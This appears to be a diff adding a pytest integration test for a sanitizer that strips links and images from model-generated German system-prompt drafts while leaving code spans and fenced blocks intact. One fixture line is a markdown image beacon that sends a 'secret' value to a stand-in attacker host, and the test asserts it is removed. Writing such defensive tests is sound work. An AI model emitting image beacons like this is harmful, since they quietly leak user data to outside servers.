@@ -241,6 +241,49 @@ def test_generate_assistant_draft_sanitize_after_midline_tilde(
 
 
 @pytest.mark.integration
+@patch("core.llm_helpers.ModelRegistry.get_model")
+def test_generate_assistant_draft_code_boundaries_and_variants(
+    mock_get_model, test_client: TestClient, langfuse_root
+) -> None:
+    responses = {
+        "assistant-draft-system-prompt": (
+            "Vorlage ``[Beispiel](https://beispiel.example.com)`` bleibt.\n"
+            "```text\nmit ``` eingebettet\n[inner](https://beispiel.example.com)\n```\n"
+            "![pixel](https://evil.example.com/pixel?d=secret)\n"
+            'Titel [Anleitung](https://doku.example.com "Detail").\n'
+            "![pixel]\n\n[pixel]: ../image.png"
+        ),
+        "assistant-draft-description": "Beschreibung",
+        "assistant-draft-title": "Titel",
+    }
+    mock_get_model.return_value = _FakeConfiguredModel(response_by_run_name=responses)
+
+    resp = test_client.post(
+        "/v1/generations/assistant-draft",
+        json={"prompt_seed": "Hilft bei Meeting-Protokollen"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    # Equal-length backtick runs keep the code span (and its content) intact.
+    assert "``[Beispiel](https://beispiel.example.com)``" in body["system_prompt"]
+    # An embedded fence sequence does not close the real block: the block
+    # content (with the inner link) stays verbatim until the real closer.
+    assert "[inner](https://beispiel.example.com)" in body["system_prompt"]
+    # The image after the real block close is neutralized like everywhere
+    # outside code.
+    assert "evil.example.com" not in body["system_prompt"]
+    assert "![pixel](http" not in body["system_prompt"]
+    # Links with titles are stripped to their label.
+    assert '("Titel")' not in body["system_prompt"]
+    assert "Anleitung" in body["system_prompt"]
+    # Relative destinations are recognized definitions: the definition line
+    # goes, the shortcut label stays as inert text.
+    assert "[pixel]: ../image.png" not in body["system_prompt"]
+    assert "![pixel]" in body["system_prompt"]
+
+
+@pytest.mark.integration
 @patch(
     "api.routers.generation_router.PersistanceHelpers.set_chat_title_for_conversation",
     new_callable=AsyncMock,
